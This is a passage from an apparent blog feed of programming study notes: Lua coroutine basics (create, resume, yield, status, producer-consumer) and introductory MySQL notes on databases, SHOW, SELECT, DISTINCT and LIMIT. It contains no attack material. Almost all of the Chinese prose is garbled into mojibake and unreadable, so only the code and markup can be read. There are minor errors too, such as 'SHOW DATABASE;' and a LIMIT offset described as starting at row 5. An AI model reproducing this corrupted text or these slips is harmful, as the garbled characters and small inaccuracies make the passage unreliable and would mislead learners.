ä¸­çš„å…¨å±€å˜é‡ä¸éœ€è¦å£°æ˜å°±å¯ä»¥ä½¿ç”¨.</p><p>æ£€æµ‹æ‰€æœ‰å¯¹å…¨å±€è¡¨ä¸­ä¸å­˜åœ¨é”®çš„è®¿é—®:</p><h1 id="24-åç¨‹-Coroutine"><a href="#24-åç¨‹-Coroutine" class="headerlink" title="24 åç¨‹ (Coroutine)"></a>24 åç¨‹ (Coroutine)</h1><p>åç¨‹å¯ä»¥é¢ å€’è°ƒç”¨è€…å’Œè¢«è°ƒç”¨è€…çš„å…³ç³».</p><p>ä»å¤šçº¿ç¨‹ (multithreading) çš„è§’åº¦çœ‹, åç¨‹ (coroutine) ä¸çº¿ç¨‹ (thread) ç±»ä¼¼.</p><p>åç¨‹æ˜¯ä¸€ç³»åˆ—çš„å¯æ‰§è¡Œè¯­å¥, æ‹¥æœ‰è‡ªå·±çš„æ ˆ, å±€éƒ¨å˜é‡å’ŒæŒ‡ä»¤æŒ‡é’ˆ, åŒæ—¶åç¨‹åˆä¸å…¶ä»–åç¨‹å…±äº«äº†å…¨å±€å˜é‡å’Œå…¶ä»–å‡ ä¹ä¸€åˆ‡èµ„æº.</p><p><mark>çº¿ç¨‹å’Œåç¨‹çš„ä¸»è¦åŒºåˆ«åœ¨äº</mark> : ä¸€ä¸ªå¤šçº¿ç¨‹ç¨‹åºå¯ä»¥å¹¶è¡Œè¿è¡Œå¤šä¸ªçº¿ç¨‹, è€Œåç¨‹å´éœ€è¦å½¼æ­¤åä½œåœ°è¿è¡Œ. (æ¯•ç«Ÿåœ¨ä»»æ„æŒ‡å®šçš„æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªåç¨‹è¿è¡Œ, ä¸”åªæœ‰å½“æ­£åœ¨è¿è¡Œçš„åç¨‹æ˜¾å¼åœ°è¦æ±‚è¢«æŒ‚èµ· (suspend) æ—¶å…¶æ‰§è¡Œæ‰ä¼šæš‚åœ)</p><h2 id="24-1-åç¨‹åŸºç¡€"><a href="#24-1-åç¨‹åŸºç¡€" class="headerlink" title="24.1 åç¨‹åŸºç¡€"></a>24.1 åç¨‹åŸºç¡€</h2><p>Lua è¯­è¨€ä¸­åç¨‹ç›¸å…³çš„æ‰€æœ‰å‡½æ•°éƒ½è¢«æ”¾åœ¨è¡¨ <code>coroutine</code> ä¸­.</p><p><code>create()</code> åˆ›å»ºæ–°åç¨‹, å…¶åªæœ‰ä¸€ä¸ªå‚æ•°, å³åç¨‹è¦æ‰§è¡Œçš„ä»£ç çš„å‡½æ•°. å…¶è¿”å›ä¸€ä¸ª <code>thread</code> ç±»å‹çš„å€¼, å³æ–°åç¨‹.</p><p>é€šå¸¸, <code>create()</code> çš„å‚æ•°æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">co = <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">create</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span></span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hi&quot;</span>) <span class="hljs-keyword">end</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(co))<br></code></pre></td></tr></table></figure><p>åç¨‹æœ‰å››ç§çŠ¶æ€:</p><ul><li>æŒ‚èµ· (suspended)</li><li>è¿è¡Œ (running)</li><li>æ­£å¸¸ (normal)</li><li>æ­»äº¡ (dead)</li></ul><p>å¯ä»¥ç”¨ <code>coroutine.status</code> æ¥æ£€æŸ¥åç¨‹çš„çŠ¶æ€:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">status</span>(co))<br></code></pre></td></tr></table></figure><p>å½“ä¸€ä¸ªåç¨‹è¢«åˆ›å»ºæ—¶, å®ƒå¤„äºæŒ‚èµ·çŠ¶æ€.</p><p><code>coroutine.resume</code> ç”¨äºå¯åŠ¨æˆ–åœ¨å…¶å¯åŠ¨ä¸€ä¸ªåç¨‹çš„æ‰§è¡Œ, å¹¶å°†å…¶çŠ¶æ€ç”±æŒ‚èµ·æ”¹ä¸ºè¿è¡Œ:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">resume</span>(co)<br></code></pre></td></tr></table></figure><p><code>resume</code> çš„å…¶ä»–å‚æ•°ä¸ºä¼ å…¥çš„å‚æ•°.</p><p>åç¨‹çš„çœŸæ­£å¼ºå¤§ä¹‹å¤„åœ¨äºå‡½æ•° <code>yield</code>, è¯¥å‡½æ•°å¯ä»¥è®©ä¸€ä¸ªè¿è¡Œä¸­çš„åç¨‹æŒ‚èµ·è‡ªå·±, ç„¶åå†åç»­æ¢å¤è¿è¡Œ:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lua">co = <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">create</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span></span><br>    <span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">10</span> <span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;co&quot;</span>, i)<br>        <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">yield</span>()<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">status</span>(co))<br></code></pre></td></tr></table></figure><p>è¿™é‡ŒåŠ ä¸Š <code>yield</code> çš„ä½œç”¨ä¸º, <code>for</code> å¾ªç¯è¿è¡Œä¸€æ¬¡å°±å†æ¬¡æŒ‚èµ·.</p><p>åç¨‹å¹¶ä¸æ˜¯ä¸€ä¸ªæ— é™å¾ªç¯çš„ç¨‹åº, è¿è¡Œç»“æŸåå°±ä¼š <code>dead</code>, å°±åƒè¿™é‡Œçš„ <code>for</code> å¾ªç¯ç»“æŸåå°±ä¼š <code>dead</code>. æ­¤æ—¶å†å”¤é†’å°±ä¼šæŠ¥é”™.</p><p>åƒå‡½æ•° <code>pcall</code> ä¸€æ ·, å‡½æ•° <code>resume</code> ä¹Ÿè¿è¡Œåœ¨ä¿æŠ¤æ¨¡å¼ä¸­. å› æ­¤, å¦‚æœåç¨‹åœ¨æ‰§è¡Œä¸­å‡ºé”™, Lua è¯­è¨€ä¸ä¼šæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯, è€Œæ˜¯å°†é”™è¯¯ä¿¡æ¯è¿”å›ç»™å‡½æ•° <code>resume</code>.</p><p>å½“åç¨‹ A å”¤é†’åç¨‹ B æ—¶, åç¨‹ A æ—¢ä¸æ˜¯æŒ‚èµ·çŠ¶æ€, ä¹Ÿä¸æ˜¯è¿è¡ŒçŠ¶æ€, å› æ­¤æ­¤æ—¶çš„çŠ¶æ€è¢«ç§°ä¸º <mark>æ­£å¸¸çŠ¶æ€</mark>.</p><p><code>resume</code> çš„å…¶ä»–å‚æ•°, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua">co = <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">create</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(a, b, c)</span></span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;co&quot;</span>, a, b, c + <span class="hljs-number">2</span>)<br><span class="hljs-keyword">end</span>)<br><br><span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">resume</span>(co, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p><mark><code>coroutine.resume</code> çš„è¿”å›å€¼</mark>ä¸­:</p><ul><li>ç¬¬ä¸€ä¸ªè¿”å›å€¼ä¸º <code>true</code> æ—¶è¡¨ç¤ºæ²¡æœ‰é”™è¯¯</li><li>å…¶ä»–çš„è¿”å›å€¼å¯¹åº”å‡½æ•° <code>yield</code> çš„å‚æ•°</li></ul><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua">co = <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">create</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(a, b)</span></span><br>    <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">yield</span>(a+b, a-b)<br><span class="hljs-keyword">end</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">resume</span>(co, <span class="hljs-number">20</span>, <span class="hljs-number">10</span>)) <span class="hljs-comment">--&gt; true 30 10</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>yield</code> çš„å‚æ•°ä¸º <code>a+b</code> å’Œ <code>a-b</code>, ä¹Ÿå°±æ˜¯å…¶ä½™çš„è¿”å›å€¼.</p><p><mark><code>coroutine.yield</code> çš„è¿”å›å€¼æ˜¯å¯¹åº” <code>resume</code> çš„å‚æ•°, å³è¿”å› <code>resume</code> çš„å‚æ•°</mark> :</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua">co = <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">create</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(x)</span></span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;co1&quot;</span>, x)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;co2&quot;</span>, <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">yield</span>())<br><span class="hljs-keyword">end</span>)<br><br><span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">resume</span>(co, <span class="hljs-string">&quot;hi&quot;</span>) <span class="hljs-comment">--&gt; co1 hi</span><br><span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">resume</span>(co, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>) <span class="hljs-comment">--&gt; co2 4 5</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡º, æ˜¯ <code>resume</code> çš„åé¢çš„å‚æ•°.</p><p>å½“ä¸€ä¸ªåç¨‹è¿è¡Œç»“æŸæ—¶, <mark>ä¸»å‡½æ•°æ‰€è¿”å›çš„å€¼</mark> éƒ½å°†å˜æˆå¯¹åº”å‡½æ•° <code>resume</code> çš„è¿”å›å€¼.</p><p><mark>éå¯¹ç§°åç¨‹ (asymmetric coroutine)</mark>, å³ç”¨ä¸¤ä¸ªå‡½æ•°æ¥æ§åˆ¶åç¨‹çš„æ‰§è¡Œ, ä¸€ä¸ªæ˜¯ç”¨äºæŒ‚èµ·åç¨‹çš„æ‰§è¡Œ, å¦ä¸€ä¸ªç”¨äºæ¢å¤åç¨‹çš„æ‰§è¡Œ.</p><p><mark>å¯¹ç§°åç¨‹ (symmetric coroutine)</mark> , å³åªæä¾›ä¸€ä¸ªå‡½æ•°ç”¨äºåœ¨ä¸€ä¸ªåç¨‹å’Œå¦ä¸€ä¸ªåç¨‹ä¹‹é—´åˆ‡æ¢æ§åˆ¶æƒ.</p><h2 id="24-2-å“ªä¸ªåç¨‹å æ®ä¸»å¾ªç¯"><a href="#24-2-å“ªä¸ªåç¨‹å æ®ä¸»å¾ªç¯" class="headerlink" title="24.2 å“ªä¸ªåç¨‹å æ®ä¸»å¾ªç¯"></a>24.2 å“ªä¸ªåç¨‹å æ®ä¸»å¾ªç¯</h2><p>ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">producer</span> <span class="hljs-params">()</span></span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">local</span> x = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>() <span class="hljs-comment">-- äº§ç”Ÿæ–°å€¼</span><br>        send(x)     <span class="hljs-comment">-- å‘ç»™æ¶ˆè´¹è€…</span><br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">consumer</span> <span class="hljs-params">()</span></span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">local</span> x = receive()     <span class="hljs-comment">-- æ¥æ”¶æ¥è‡ªç”Ÿäº§è€…çš„å€¼</span><br>        <span class="hljs-built_in">io</span>.<span class="hljs-built_in">write</span>(x, <span class="hljs-string">&quot;\n&quot;</span>) <span class="hljs-comment">-- æ¶ˆè´¹</span><br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å…·ä½“è§ä¹¦.</p><h2 id="24-3-å°†åç¨‹ç”¨ä½œè¿­ä»£å™¨"><a href="#24-3-å°†åç¨‹ç”¨ä½œè¿­ä»£å™¨" class="headerlink" title="24.3 å°†åç¨‹ç”¨ä½œè¿­ä»£å™¨"></a>24.3 å°†åç¨‹ç”¨ä½œè¿­ä»£å™¨</h2>]]></content>
    
    
    <categories>
      
      <category>Lua</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL å¿…çŸ¥å¿…ä¼š Notes</title>
    <link href="/2022/12/27/MySQL-%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A-Notes/"/>
    <url>/2022/12/27/MySQL-%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬1ç« -äº†è§£-SQL"><a href="#ç¬¬1ç« -äº†è§£-SQL" class="headerlink" title="ç¬¬1ç«  äº†è§£ SQL"></a>ç¬¬1ç«  äº†è§£ SQL</h1><h2 id="1-1-æ•°æ®åº“åŸºç¡€"><a href="#1-1-æ•°æ®åº“åŸºç¡€" class="headerlink" title="1.1 æ•°æ®åº“åŸºç¡€"></a>1.1 æ•°æ®åº“åŸºç¡€</h2><h3 id="1-1-1-ä»€ä¹ˆæ˜¯æ•°æ®åº“"><a href="#1-1-1-ä»€ä¹ˆæ˜¯æ•°æ®åº“" class="headerlink" title="1.1.1 ä»€ä¹ˆæ˜¯æ•°æ®åº“"></a>1.1.1 ä»€ä¹ˆæ˜¯æ•°æ®åº“</h3><p><mark>æ•°æ®åº“è½¯ä»¶ç§°ä¸º DBMS (Data Base Manage System, æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ)</mark> </p><p><mark>æ•°æ®åº“</mark> æ˜¯é€šè¿‡ DBMS åˆ›å»ºå’Œæ“çºµçš„å®¹å™¨.</p><p>DBMS æ›¿ä½ è®¿é—®æ•°æ®åº“.</p><h3 id="1-1-2-è¡¨-table"><a href="#1-1-2-è¡¨-table" class="headerlink" title="1.1.2 è¡¨ table"></a>1.1.2 è¡¨ table</h3><p>å­˜å‚¨åœ¨è¡¨ä¸­çš„æ•°æ®æ˜¯ä¸€ç§ç±»å‹çš„æ•°æ®æˆ–ä¸€ä¸ªæ¸…å•.</p><p>åŒä¸€æ•°æ®åº“ä¸­çš„æ¯ä¸ªè¡¨éƒ½æœ‰<mark>ä¸€ä¸ªå”¯ä¸€åå­—</mark>ç”¨æ¥æ ‡è¯†.</p><p><mark>æ¨¡å¼ (schema)</mark> æ˜¯å…³äºæ•°æ®åº“å’Œè¡¨çš„å¸ƒå±€åŠç‰¹å¾çš„ä¿¡æ¯.</p><h3 id="1-1-3-åˆ—å’Œæ•°æ®ç±»å‹"><a href="#1-1-3-åˆ—å’Œæ•°æ®ç±»å‹" class="headerlink" title="1.1.3 åˆ—å’Œæ•°æ®ç±»å‹"></a>1.1.3 åˆ—å’Œæ•°æ®ç±»å‹</h3><p>å¯ä»¥æŠŠæ•°æ®åº“ä¸­çš„ä¸€ä¸ªè¡¨ç†è§£ä¸ºä¸€ä¸ªç½‘æ ¼:</p><p><img src="/../img/image_database.png"></p><p>ç½‘æ ¼ä¸­çš„<mark>æ¯ä¸€åˆ—</mark>å­˜å‚¨è€…ä¸€æ¡ç‰¹å®šçš„ä¿¡æ¯.</p><h3 id="1-1-4-è¡Œ"><a href="#1-1-4-è¡Œ" class="headerlink" title="1.1.4 è¡Œ"></a>1.1.4 è¡Œ</h3><p>è¡¨ä¸­çš„æ•°æ®æ˜¯æŒ‰è¡Œå­˜å‚¨çš„.</p><p>è¡Œ (row) å’Œè®°å½• (record) å¯äº’æ¢æ¦‚å¿µ.</p><h3 id="1-1-5-ä¸»é”®-primary-key"><a href="#1-1-5-ä¸»é”®-primary-key" class="headerlink" title="1.1.5 ä¸»é”® primary key"></a>1.1.5 ä¸»é”® primary key</h3><p>å”¯ä¸€æ ‡è¯†è¡¨ä¸­æ¯è¡Œçš„è¿™ä¸ªåˆ— (æˆ–è¿™ç»„åˆ—) ç§°ä¸º <mark>ä¸»é”®</mark> </p><h2 id="1-2-ä»€ä¹ˆæ˜¯-SQL"><a href="#1-2-ä»€ä¹ˆæ˜¯-SQL" class="headerlink" title="1.2 ä»€ä¹ˆæ˜¯ SQL"></a>1.2 ä»€ä¹ˆæ˜¯ SQL</h2><p>SQL, Structured Query Language. æ˜¯ä¸€ç§ä¸“é—¨ç”¨æ¥ä¸æ•°æ®åº“é€šä¿¡çš„è¯­è¨€.</p><h1 id="ç¬¬2ç« -MySQL-ç®€ä»‹"><a href="#ç¬¬2ç« -MySQL-ç®€ä»‹" class="headerlink" title="ç¬¬2ç«  MySQL ç®€ä»‹"></a>ç¬¬2ç«  MySQL ç®€ä»‹</h1><h2 id="2-1-ä»€ä¹ˆæ˜¯-MySQL"><a href="#2-1-ä»€ä¹ˆæ˜¯-MySQL" class="headerlink" title="2.1 ä»€ä¹ˆæ˜¯ MySQL"></a>2.1 ä»€ä¹ˆæ˜¯ MySQL</h2><p>MySQL æ˜¯ä¸€ç§ DBMS, å³ä¸€ç§æ•°æ®åº“è½¯ä»¶ã€‚</p><h3 id="2-1-1-å®¢æˆ·æœº-æœåŠ¡å™¨è½¯ä»¶"><a href="#2-1-1-å®¢æˆ·æœº-æœåŠ¡å™¨è½¯ä»¶" class="headerlink" title="2.1.1 å®¢æˆ·æœº-æœåŠ¡å™¨è½¯ä»¶"></a>2.1.1 å®¢æˆ·æœº-æœåŠ¡å™¨è½¯ä»¶</h3><p>DBMS å¯åˆ†ä¸ºä¸¤ç±»:</p><ul><li>åŸºäºå…±äº«æ–‡ä»¶ç³»ç»Ÿçš„ DBMS</li><li>åŸºäºå®¢æˆ·æœº-æœåŠ¡å™¨çš„ DBMS</li></ul><p>å…³äºæ•°æ®, æ•°æ®æ·»åŠ , åˆ é™¤å’Œæ•°æ®æ›´æ–°çš„æ‰€æœ‰è¯·æ±‚éƒ½ç”± <mark>æœåŠ¡å™¨è½¯ä»¶</mark> å®Œæˆ. (ä¹Ÿå°±æ˜¯å¤„ç†è¯·æ±‚)</p><p>è¿™äº›è¯·æ±‚æˆ–æ›´æ”¹æ¥è‡ªè¿è¡Œ <mark>å®¢æˆ·æœºè½¯ä»¶</mark> çš„è®¡ç®—æœº. (ä¹Ÿå°±æ˜¯å‘é€è¯·æ±‚)</p><p>MySQL æ˜¯ä¸€ä¸ªå®¢æˆ·æœº-æœåŠ¡å™¨ DBMS.</p><h2 id="2-2-MySQL-å·¥å…·"><a href="#2-2-MySQL-å·¥å…·" class="headerlink" title="2.2 MySQL å·¥å…·"></a>2.2 MySQL å·¥å…·</h2><p><code>mysql</code> è¿™ä¸ªå‘½ä»¤è¡Œå·¥å…·.</p><h3 id="2-2-2-MySQL-Administrator"><a href="#2-2-2-MySQL-Administrator" class="headerlink" title="2.2.2 MySQL Administrator"></a>2.2.2 MySQL Administrator</h3><p>MySQL Administrator æ˜¯ä¸€ä¸ªå›¾å½¢äº¤äº’å®¢æˆ·æœº, ç”¨æ¥ç®€åŒ– MySQL æœåŠ¡å™¨çš„ç®¡ç†.</p><p>MySQL Administrator ä¸ä½œä¸ºæ ¸å¿ƒ MySQL çš„ç»„æˆéƒ¨åˆ†å®‰è£….</p><h3 id="2-2-3-MySQL-Query-Browser"><a href="#2-2-3-MySQL-Query-Browser" class="headerlink" title="2.2.3 MySQL Query Browser"></a>2.2.3 MySQL Query Browser</h3><p>MySQL Query Browser ä¸ºä¸€ä¸ªå›¾å½¢äº¤äº’å®¢æˆ·æœº, ç”¨æ¥ç¼–å†™å’Œæ‰§è¡Œ MySQL å‘½ä»¤.</p><p>MySQL Query Browser ä¹Ÿä¸ä½œä¸ºæ ¸å¿ƒ MySQL çš„ç»„æˆéƒ¨åˆ†å®‰è£….</p><h1 id="ç¬¬3ç« -ä½¿ç”¨-MySQL"><a href="#ç¬¬3ç« -ä½¿ç”¨-MySQL" class="headerlink" title="ç¬¬3ç«  ä½¿ç”¨ MySQL"></a>ç¬¬3ç«  ä½¿ç”¨ MySQL</h1><p>MySQL ä¸æ‰€æœ‰å®¢æˆ·æœº-æœåŠ¡å™¨ DBMS ä¸€æ ·, è¦æ±‚åœ¨èƒ½æ‰§è¡Œå‘½ä»¤ä¹‹å‰<mark>ç™»å½•</mark>åˆ° DBMS.</p><p>ä¸ºäº†è¿æ¥åˆ° MySQL éœ€è¦:</p><ul><li>ä¸»æœºå, æœ¬åœ°åˆ™ä¸º localhost</li><li>ç«¯å£</li><li>ç”¨æˆ·å</li><li>ç”¨æˆ·å£ä»¤</li></ul><h2 id="3-2-é€‰æ‹©æ•°æ®åº“"><a href="#3-2-é€‰æ‹©æ•°æ®åº“" class="headerlink" title="3.2 é€‰æ‹©æ•°æ®åº“"></a>3.2 é€‰æ‹©æ•°æ®åº“</h2><p>ä½¿ç”¨ <code>USE</code> å…³é”®å­—.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">USE DATABASE;<br></code></pre></td></tr></table></figure><h2 id="3-3-äº†è§£æ•°æ®åº“å’Œè¡¨"><a href="#3-3-äº†è§£æ•°æ®åº“å’Œè¡¨" class="headerlink" title="3.3 äº†è§£æ•°æ®åº“å’Œè¡¨"></a>3.3 äº†è§£æ•°æ®åº“å’Œè¡¨</h2><p>æ˜¾ç¤ºå¯ç”¨çš„æ•°æ®åº“åˆ—è¡¨.</p><p>æ•°æ®åº“, è¡¨, åˆ—, ç”¨æˆ·, æƒé™ç­‰çš„ä¿¡æ¯è¢«å­˜å‚¨åœ¨æ•°æ®åº“å’Œè¡¨ä¸­, ä½†å†…éƒ¨çš„è¡¨ä¸€èˆ¬ä¸ç›´æ¥è®¿é—®.</p><p>ä½¿ç”¨ <code>SHOW</code> å‘½ä»¤æ¥æ˜¾ç¤ºè¿™äº›ä¿¡æ¯.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> DATABASE;<br></code></pre></td></tr></table></figure><p>è¿”å›å¯ç”¨æ•°æ®åº“çš„ä¸€ä¸ªåˆ—è¡¨.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> TABLES;<br></code></pre></td></tr></table></figure><p>è·å¾—ä¸€ä¸ªæ•°æ®åº“å†…çš„è¡¨çš„åˆ—è¡¨.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> COLUMNS <span class="hljs-keyword">FROM</span> customers<br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºåˆ—.</p><p>è¿˜å¯æŸ¥è¯¢:</p><ul><li><code>SHOW STATUS</code></li><li><code>SHOW CREATE DATABASE</code> å’Œ  <code>SHOW CREATE TABLE</code></li><li><code>SHOW GRANTS</code></li><li><code>SHOW ERRORS</code> å’Œ <code>SHOW WARNINGS</code></li></ul><h1 id="ç¬¬4ç« -æ£€ç´¢æ•°æ®"><a href="#ç¬¬4ç« -æ£€ç´¢æ•°æ®" class="headerlink" title="ç¬¬4ç«  æ£€ç´¢æ•°æ®"></a>ç¬¬4ç«  æ£€ç´¢æ•°æ®</h1><h2 id="4-1-SELECT-è¯­å¥"><a href="#4-1-SELECT-è¯­å¥" class="headerlink" title="4.1 SELECT è¯­å¥"></a>4.1 SELECT è¯­å¥</h2><p>æ£€ç´¢è¡¨æ•°æ®.</p><h2 id="4-2-æ£€ç´¢å•ä¸ªåˆ—"><a href="#4-2-æ£€ç´¢å•ä¸ªåˆ—" class="headerlink" title="4.2 æ£€ç´¢å•ä¸ªåˆ—"></a>4.2 æ£€ç´¢å•ä¸ªåˆ—</h2><p>å¤šæ¡ SQL è¯­å¥å¿…é¡»ä»¥åˆ†å· <code>;</code> åˆ†éš”.</p><p>SQL è¯­å¥ä¸åŒºåˆ†å¤§å°å†™.</p><p>åœ¨å¤„ç† SQL è¯­å¥æ—¶, å…¶ä¸­æ‰€æœ‰ç©ºæ ¼éƒ½è¢«å¿½ç•¥.</p><h2 id="4-3-æ£€ç´¢å¤šä¸ªåˆ—"><a href="#4-3-æ£€ç´¢å¤šä¸ªåˆ—" class="headerlink" title="4.3 æ£€ç´¢å¤šä¸ªåˆ—"></a>4.3 æ£€ç´¢å¤šä¸ªåˆ—</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_name, prod_price<br><span class="hljs-keyword">FROM</span> products;<br></code></pre></td></tr></table></figure><h2 id="4-4-æ£€ç´¢æ‰€æœ‰åˆ—"><a href="#4-4-æ£€ç´¢æ‰€æœ‰åˆ—" class="headerlink" title="4.4 æ£€ç´¢æ‰€æœ‰åˆ—"></a>4.4 æ£€ç´¢æ‰€æœ‰åˆ—</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <br><span class="hljs-keyword">FROM</span> products;<br></code></pre></td></tr></table></figure><h2 id="4-5-æ£€ç´¢ä¸åŒçš„è¡Œ"><a href="#4-5-æ£€ç´¢ä¸åŒçš„è¡Œ" class="headerlink" title="4.5 æ£€ç´¢ä¸åŒçš„è¡Œ"></a>4.5 æ£€ç´¢ä¸åŒçš„è¡Œ</h2><p>ä½¿ç”¨ <code>DISTINCT</code> å…³é”®å­—. è¿”å›ä¸åŒè¡Œ:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> vend_id<br><span class="hljs-keyword">FROM</span> products;<br></code></pre></td></tr></table></figure><h2 id="4-6-é™åˆ¶ç»“æœ"><a href="#4-6-é™åˆ¶ç»“æœ" class="headerlink" title="4.6 é™åˆ¶ç»“æœ"></a>4.6 é™åˆ¶ç»“æœ</h2><p>ä½¿ç”¨ <code>LIMIT</code>, è¿”å›çš„ç»“æœä¸å¤šäº:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_name<br><span class="hljs-keyword">FROM</span> products<br>LIMIT <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>æŒ‡å®šå¼€å§‹è¡Œå’Œè¡Œæ•°:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_name<br><span class="hljs-keyword">FROM</span> products<br>LIMIT <span class="hljs-number">5</span>,<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>ä»ç¬¬ 5 è¡Œå¼€å§‹çš„ 5 è¡Œ.</p><p>å¸¦ä¸€ä¸ªå€¼çš„ <code>LIMIT</code> ä¹Ÿå°±æ˜¯é»˜è®¤ä»ç¬¬ä¸€è¡Œå¼€å§‹.</p><h2 id="4-7-ä½¿ç”¨å®Œå…¨é™å®šçš„è¡¨å"><a 